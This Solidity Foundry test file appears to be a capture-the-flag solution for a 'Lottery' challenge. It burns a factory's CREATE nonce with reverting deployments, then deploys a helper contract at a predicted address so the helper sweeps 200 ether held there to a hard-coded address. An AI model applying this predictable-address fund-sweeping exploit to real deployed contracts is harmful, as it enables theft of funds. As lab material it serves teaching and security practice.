// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

contract Factory {
    function dep(bytes memory _code) public payable returns (address x) {
        require(msg.value >= 10 ether);
       
        assembly {
            x := create(0, add(0x20, _code), mload(_code))
        }
        if (x == address(0)) payable(msg.sender).transfer(msg.value);
    }
}

contract Lottery is Test {
   
    Factory private factory;
    address attacker;

    function setUp() public {
        factory = new Factory();
        attacker = makeAddr("attacker");
    }

    function testLottery() public {
        vm.deal(attacker, 11 ether);
        vm.deal(0x0A1EB1b2d96a175608edEF666c171d351109d8AA, 200 ether);
        vm.startPrank(attacker);
       
        //Solution

        console.log("attacker address: ", attacker);

        // Deploy code
        bytes memory _code = type(Helper).creationCode;
        console.log("helper contract bytecode: ");
        console.logBytes(_code);
        
        // for (uint256 i = 0; i < 100; i++) {
        //     address deployedAddress = factory.dep(_code);
        //     console.log("deployedAddress: ", deployedAddress);
        //     console.log("attacker balance: ", attacker.balance);

        //     if (deployedAddress == 0x0A1EB1b2d96a175608edEF666c171d351109d8AA) {
        //         console.log("Found! nonce is: ", i);
        //         break;
        //     }
        // }

        // nonce is 16
        
        // Increase the nonce of Factory contract
        for (uint256 i = 0; i < 16; i++) {
            address deployedAddress = factory.dep{value: 10 ether}(type(Dummy).creationCode);
            console.log("deployedAddress: ", deployedAddress);
            console.log("attacker balance: ", attacker.balance);
        }
        address deployedAddress = factory.dep{value: 10 ether}(_code);
        console.log("deployedAddress: ", deployedAddress);

        vm.stopPrank();
        assertGt(attacker.balance, 200 ether);
    }
}

contract Helper {

    constructor() {
        payable(0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e).transfer(address(this).balance);
    }
}

contract Dummy {
    constructor() payable {
        require(msg.value >= 100 ether);
    }
}